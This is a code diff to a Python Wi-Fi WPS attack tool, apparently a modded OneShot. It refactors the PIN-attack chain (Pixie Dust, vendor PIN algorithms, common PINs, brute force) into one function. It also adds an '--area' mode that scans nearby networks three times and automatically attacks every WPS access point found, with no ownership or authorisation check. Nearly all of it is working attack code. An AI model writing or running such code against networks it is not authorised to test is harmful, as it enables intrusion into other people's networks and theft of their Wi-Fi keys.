@@ -1424,6 +1424,33 @@ def try_bruteforce_file(comp, bssid, path):
     print(f"[!] Failed to open bruteforce file: {last}")
     return False
 
+
+def attack_network(companion, args, bssid, network=None, essid=None):
+    if args.pin:
+        companion.single_connection(bssid, args.pin, args.pixie_dust, args.push_button_connect, args.pixie_force)
+    else:
+        model = network.get('Model', '') + network.get('Model number', '') if network else ''
+        device = network.get('Device name', '') if network else ''
+        if not try_pin_sequence(companion, bssid, generate_model_pins(mac=bssid, ssid=essid, model=model, device=device)):
+            if args.pixie_dust:
+                print('[*] Trying Pixie Dust attack...')
+                companion.single_connection(bssid, None, pixiemode=True, pixieforce=args.pixie_force)
+            if companion.connection_status.status != 'GOT_PSK':
+                if not try_pin_sequence(companion, bssid, generate_suggested_pins(bssid)):
+                    if not try_pin_sequence(companion, bssid, COMMON_PINS):
+                        pins = generate_pins(mac=bssid, ssid=essid)
+                        if not try_pin_sequence(companion, bssid, pins):
+                            if not try_pin_sequence(companion, bssid, [p for p in [arcadyan_pin(bssid)] if p]):
+                                if not try_pin_sequence(companion, bssid, [p for p in [belkin_pin(bssid)] if p]):
+                                    if isinstance(args.bruteforce_pins, str):
+                                        print('[*] Trying PINs from file...')
+                                        if not try_bruteforce_file(companion, bssid, args.bruteforce_pins):
+                                            print('[-] All PIN attempts failed.')
+                                    elif args.bruteforce_pins is True:
+                                        companion.smart_bruteforce(bssid, args.pin, args.delay)
+                                    else:
+                                        print('[-] All PIN attempts failed.')
+
 def build_parser():
     parser = argparse.ArgumentParser(description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg', epilog='Example: %(prog)s --interface wlan0 --bssid 00:90:4C:C1:AC:21 --pixie-dust')
     parser.add_argument('--interface', type=str, required=True, help='Name of the interface to use')
@@ -1438,6 +1465,7 @@ def build_parser():
     parser.add_argument('--write', action='store_true', help='Write credentials to the file on success')
     parser.add_argument('--iface-down', action='store_true', help='Down network interface when the work is finished')
     parser.add_argument('--loop', action='store_true', help='Run in a loop')
+    parser.add_argument('--area', action='store_true', help='Scan area 3 times, remember networks, and test them automatically')
     parser.add_argument('--reverse-scan', action='store_true', help='Reverse order of networks in the list of networks. Useful on small displays')
     parser.add_argument('--mtk-wifi', action='store_true', help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.')
     parser.add_argument('--verbose', action='store_true', help='Verbose output')
@@ -1458,6 +1486,27 @@ if __name__ == '__main__':
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
 
+    if args.area and not args.bssid:
+        scanner = WiFiScanner(args.interface, vuln_list, args.reverse_scan)
+        networks = {}
+        for _ in range(3):
+            res = scanner.iw_scanner()
+            if res:
+                for net in res.values():
+                    networks[net['BSSID']] = net
+            time.sleep(1)
+        if not networks:
+            print('[-] No WPS networks found.')
+        else:
+            for net in networks.values():
+                companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                companion.pixie_another_method = args.pixie_another_method
+                essid = net.get('ESSID')
+                attack_network(companion, args, net['BSSID'], network=net, essid=essid)
+        if args.iface_down:
+            ifaceUp(args.interface, down=True)
+        sys.exit(0)
+
     while True:
         check_exit()
         companion = Companion(args.interface, args.write, print_debug=args.verbose)
@@ -1476,32 +1525,7 @@ if __name__ == '__main__':
                     args.bssid = network['BSSID']
                     essid = network.get('ESSID')
             if args.bssid:
-                companion = Companion(args.interface, args.write, print_debug=args.verbose)
-                companion.pixie_another_method = args.pixie_another_method
-                if args.pin:
-                    companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.push_button_connect, args.pixie_force)
-                else:
-                    model = network.get('Model', '') + network.get('Model number', '') if network else ''
-                    device = network.get('Device name', '') if network else ''
-                    if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device)):
-                        if args.pixie_dust:
-                            print('[*] Trying Pixie Dust attack...')
-                            companion.single_connection(args.bssid, None, pixiemode=True, pixieforce=args.pixie_force)
-                        if companion.connection_status.status != 'GOT_PSK':
-                            if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid)):
-                                if not try_pin_sequence(companion, args.bssid, COMMON_PINS):
-                                    pins = generate_pins(mac=args.bssid, ssid=essid)
-                                    if not try_pin_sequence(companion, args.bssid, pins):
-                                        if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p]):
-                                            if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p]):
-                                                if isinstance(args.bruteforce_pins, str):
-                                                    print('[*] Trying PINs from file...')
-                                                    if not try_bruteforce_file(companion, args.bssid, args.bruteforce_pins):
-                                                        print('[-] All PIN attempts failed.')
-                                                elif args.bruteforce_pins is True:
-                                                    companion.smart_bruteforce(args.bssid, args.pin, args.delay)
-                                                else:
-                                                    print('[-] All PIN attempts failed.')
+                attack_network(companion, args, args.bssid, network=network, essid=essid)
         if not args.loop:
             break
         else:
